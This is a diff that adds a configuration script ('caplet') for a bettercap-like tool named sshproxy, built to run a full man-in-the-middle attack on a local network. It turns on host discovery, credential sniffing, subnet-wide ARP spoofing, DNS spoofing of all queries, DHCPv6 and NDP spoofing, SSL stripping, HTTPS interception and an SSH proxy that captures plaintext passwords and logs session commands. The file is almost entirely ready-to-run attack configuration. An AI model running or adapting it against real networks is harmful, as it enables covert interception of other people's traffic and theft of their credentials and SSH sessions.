@@ -1,0 +1,118 @@
+# sshproxy.cap — Comprehensive MITM caplet
+#
+# This caplet activates every available spoofer and proxy to perform
+# full network interception on both IPv4 and IPv6 with SSH MITM.
+#
+# Usage:
+#   sudo ./sshproxy -caplet sshproxy.cap
+#   sudo ./sshproxy -caplet sshproxy.cap -eval "set arp.spoof.targets 192.168.1.0/24"
+#
+# NOTE: Run as root. On Linux all features work. On macOS packet.proxy
+#       is unavailable and NDP/DHCPv6 have limited support.
+
+# ===========================================================
+# 1. NETWORK DISCOVERY
+#    net.recon reads the ARP cache; net.probe actively sends
+#    UDP probes (NBNS, mDNS, UPnP, WSD) to find every host.
+# ===========================================================
+set net.probe.nbns    true
+set net.probe.mdns    true
+set net.probe.upnp    true
+set net.probe.wsd     true
+set net.probe.throttle 10
+
+net.recon on
+net.probe on
+
+# ===========================================================
+# 2. CREDENTIAL SNIFFER
+#    Passive sniffing for cleartext credentials (HTTP, FTP,
+#    NTLM, Kerberos, etc.) flowing through us.
+# ===========================================================
+set net.sniff.verbose false
+set net.sniff.local   false
+net.sniff on
+
+# ===========================================================
+# 3. ARP SPOOFING (IPv4)
+#    Full-duplex: poison both victim AND gateway ARP caches.
+#    Targets the entire subnet by default; override with:
+#      set arp.spoof.targets 192.168.1.50,192.168.1.51
+# ===========================================================
+set arp.spoof.fullduplex true
+set arp.spoof.internal   true
+
+# ===========================================================
+# 4. DNS SPOOFING
+#    Respond to DNS queries with our address. By default
+#    answers all queries (dns.spoof.all true). Set specific
+#    domains with dns.spoof.domains if you want targeted use.
+# ===========================================================
+set dns.spoof.all     true
+set dns.spoof.ttl     1024
+
+# ===========================================================
+# 5. DHCPv6 SPOOFING (IPv6)
+#    Reply to DHCPv6 solicitations to inject ourselves as
+#    the DNS server for IPv6 clients (mitm6-style attack).
+# ===========================================================
+set dhcp6.spoof.domains microsoft.com, google.com, facebook.com, apple.com, twitter.com, github.com
+
+# ===========================================================
+# 6. NDP SPOOFING (IPv6)
+#    Send spoofed Neighbor Advertisements and Router
+#    Advertisements on IPv6 networks. Set ndp.spoof.targets
+#    for specific victims, or leave empty for RA-only attack.
+# ===========================================================
+set ndp.spoof.prefix          d00d::
+set ndp.spoof.prefix.length   64
+set ndp.spoof.router_lifetime 10
+
+# ===========================================================
+# 7. HTTP PROXY with SSL STRIP
+#    Intercept HTTP traffic and attempt to downgrade HTTPS
+#    links to HTTP (sslstrip). JS injection is available via
+#    http.proxy.injectjs if needed.
+# ===========================================================
+set http.proxy.sslstrip true
+
+# ===========================================================
+# 8. HTTPS PROXY
+#    Intercept HTTPS traffic with on-the-fly certificate
+#    generation. Victims will see certificate warnings unless
+#    you install the CA cert on their machines.
+# ===========================================================
+set https.proxy.sslstrip true
+
+# ===========================================================
+# 9. SSH MITM PROXY
+#    Intercept all SSH (port 22) traffic. The proxy presents
+#    its own host key, captures plaintext credentials, and
+#    logs all session data (commands, output) to stdout.
+#    On Linux the original destination is auto-detected via
+#    SO_ORIGINAL_DST; on macOS via pf state table lookup.
+# ===========================================================
+# ssh.address is left empty — auto-detect destination per connection
+set ssh.port       22
+set ssh.proxy.port 2222
+
+# ===========================================================
+# 10. ACTIVATE EVERYTHING
+#     Order matters: start proxies first so the firewall
+#     redirections are in place before spoofers push traffic
+#     through us.
+# ===========================================================
+http.proxy  on
+https.proxy on
+ssh.proxy   on
+
+arp.spoof   on
+dns.spoof   on
+dhcp6.spoof on
+ndp.spoof   on
+
+# ===========================================================
+# The event stream is auto-started and will print all
+# captured credentials, SSH session logs, and module events
+# to stdout in real-time.
+# ===========================================================
